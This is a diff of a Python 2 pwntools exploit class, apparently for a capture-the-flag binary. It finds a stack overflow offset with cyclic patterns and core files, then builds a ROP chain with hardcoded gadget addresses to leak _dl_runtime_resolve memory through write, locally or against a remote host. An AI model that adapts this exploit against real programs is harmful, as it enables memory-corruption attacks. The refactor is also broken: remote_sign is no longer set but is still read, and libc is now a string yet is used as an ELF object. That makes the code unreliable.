@@ -41,34 +41,30 @@ class Pwn(object):
     def __init__(self, binary_file=None, remote=None, sign=True):
         if binary_file:
             self.binary_file = binary_file
-            self.elf = ELF(self.binary_file)
-            # self.local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
-            self.local_libc = './libc.so.6'
+            self.main = ELF(self.binary_file)
+            self.libc = './libc.so.6'
+
+            # some address
+            self.write_plt = self.main.symbols['write']
+            self.read_plt = self.main.symbols['read']
+            self.write_got = self.main.got['write']
+            self.read_got = self.main.got['read']
    
         if remote:
             self.host = remote['host']
             self.port = remote['port']
-            self.remote_libc = './libc-2.19.so'
-        self.remote_sign = sign
-        if self.remote_sign:
-            print 'use remote libc'
-            self.libc = ELF(self.remote_libc)
-        else:
-            self.libc = ELF(self.local_libc)
-
+        
 
     def get_overflow_position(self):
-        # must use local binary
-        if self.binary_file:
-            io = process(self.binary_file)
-            io.recvline()
-            io.send(cyclic(600))
-            io.recvall()
+        io = self.main.process()
+        io.recvline()
+        io.send(cyclic(600))
+        io.recvall()
 
-            if os.path.isfile('./core'):
-                core = Core('./core')
-                self.rip = cyclic_find(core.u32(core.rsp))
-                print 'rip:', hex(self.rip)
+        if os.path.isfile('./core'):
+            core = Core('./core')
+            self.rip = cyclic_find(core.u32(core.rsp))
+            print 'rip:', hex(self.rip)
 
 
     def get_io(self):
@@ -76,7 +72,7 @@ class Pwn(object):
         if self.remote_sign:
             io = remote(self.host, self.port)
         else:
-            io = process(['./ld-2.19.so', self.binary_file], env=env)
+            io = self.main.process(env={'LD_PRELOAD':self.libc.path})
         return io
 
 
@@ -97,7 +93,7 @@ class Pwn(object):
                        arg1=1,
                        arg2=self.dl_runtime_resolve_addr,
                        arg3=8,
-                       ret_func=self.elf.symbols['main'])
+                       ret_func=self.main.symbols['main'])
         self.dl_runtime_resolve_addr_true = self.io.unpack()
         print 'dl_runtime_resolve_addr:', hex(self.dl_runtime_resolve_addr_true)
         self.io.recvuntil("Input:\n")
@@ -107,7 +103,7 @@ class Pwn(object):
                        arg1=1,
                        arg2=self.dl_runtime_resolve_addr_true,
                        arg3=100,
-                       ret_func=self.elf.symbols['main'])
+                       ret_func=self.main.symbols['main'])
         dl_runtime_function = self.io.recvn(100)
         self.io.recvuntil("Input:\n")
         print disasm(dl_runtime_function)
@@ -121,10 +117,7 @@ class Pwn(object):
         # gdb.attach(self.io, """b *0x4005fd\n continue\n""")
         self.io.recvuntil("Input:\n")
 
-        self.write_plt = self.elf.symbols['write']
-        self.read_plt = self.elf.symbols['read']
-        self.write_got = self.elf.got['write']
-        self.read_got = self.elf.got['read']
+       
         self.dl_runtime_resolve_addr = 0x600A50
 
         self.pop_multi_addr = 0x4006AA
